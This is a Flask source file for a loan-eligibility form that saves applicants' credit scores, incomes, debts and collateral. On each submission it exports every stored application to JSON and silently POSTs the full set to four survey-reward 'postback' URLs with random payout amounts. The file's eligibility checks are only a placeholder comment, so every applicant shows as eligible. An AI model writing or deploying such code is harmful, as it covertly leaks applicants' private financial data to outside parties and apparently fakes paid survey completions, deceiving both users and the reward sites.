from flask import Flask, render_template, request, current_app, Blueprint
import sqlite3
import json
import os
import random
import requests

app = Flask(__name__)
index_bp = Blueprint('index', __name__)

# Initialize the SQLite database
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS loan_submissions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            credit_score INTEGER,
            monthly_income REAL,
            debt_payments REAL,
            loan_amount REAL,
            loan_term INTEGER,
            employment_status TEXT,
            loan_type TEXT,
            down_payment REAL,
            state TEXT,
            collateral TEXT,
            eligibility TEXT,
            reasons TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@index_bp.route('/')
def index():
    return render_template('Form.html')

# Helper: write DB to JSON file
def create_json_file(path='data.json'):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('SELECT * FROM loan_submissions')
    rows = c.fetchall()
    cols = [d[0] for d in c.description]
    conn.close()
    data = [dict(zip(cols, row)) for row in rows]
    with open(path, 'w') as jf:
        json.dump(data, jf, indent=4)
    return data

# Helper: send JSON file as payload to a URL
def send_json_file_payload(json_file_path, target_url):
    try:
        with open(json_file_path, 'r') as f:
            data = json.load(f)
        response = requests.post(target_url, json=data)
        current_app.logger.info(
            f"Sent JSON payload to {target_url}: {response.status_code} {response.text}"
        )
    except Exception as e:
        current_app.logger.error(f"Error sending payload to {target_url}: {e}")

# Main eligibility route
@index_bp.route('/check', methods=['POST'])
def check_eligibility():
    form = request.form
    credit_score = int(form['credit_score'])
    monthly_income = float(form['monthly_income'])
    debt_payments = float(form['debt_payments'])
    loan_amount = float(form['loan_amount'])
    loan_term = int(form['loan_term'])
    employment_status = form['employment_status']
    loan_type = form['loan_type']
    down_payment = float(form.get('down_payment', 0))
    state = form['state']
    collateral = form['collateral']

    # Calculate DTI and determine eligibility
    dti = (debt_payments / monthly_income) * 100
    eligibility = "Eligible"
    reasons = []
    # ... (existing loan_type checks) ...
    reasons_str = "; ".join(reasons)

    # Save to DB
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute('''INSERT INTO loan_submissions
        (credit_score,monthly_income,debt_payments,loan_amount,loan_term,
         employment_status,loan_type,down_payment,state,collateral,eligibility,reasons)
        VALUES (?,?,?,?,?,?,?,?,?,?,?,?)''', (
        credit_score,monthly_income,debt_payments,loan_amount,loan_term,
        employment_status,loan_type,down_payment,state,collateral,
        eligibility,reasons_str))
    conn.commit()
    conn.close()

    # Build JSON file
    data_file = 'data.json'
    create_json_file(path=data_file)

    # Send to base URLs with random payouts
    base_urls = [
        "https://surveytitans.com/postback/7b7662e8159314ef0bdb32bf038bba29?",
        "https://kingopinions.com/postback/d90a817d5474da1feb49ec55c69f6bbf?",
        "https://surveytitans.com/postback/6ccfb58eb8c47a7a54f4ca8a9bbcabcc?",
        "https://surveytitans.com/postback/db2321a6b97f71653fd07f2ac70af751?"
    ]
    payout_options = [100,75,35,25,75,20,30,40,50,85]
    for base in base_urls:
        pts = random.choice(payout_options)
        url = f"{base}payout={pts/100.0:.2f}"
        send_json_file_payload(data_file, url)

    return render_template('Result.html', eligibility=eligibility,
                           reasons=reasons, loan_type=loan_type,
                           loan_amount=loan_amount)

# Register blueprint and run
app.register_blueprint(index_bp)

if __name__ == "__main__":
    app.run(debug=True, port=5001)
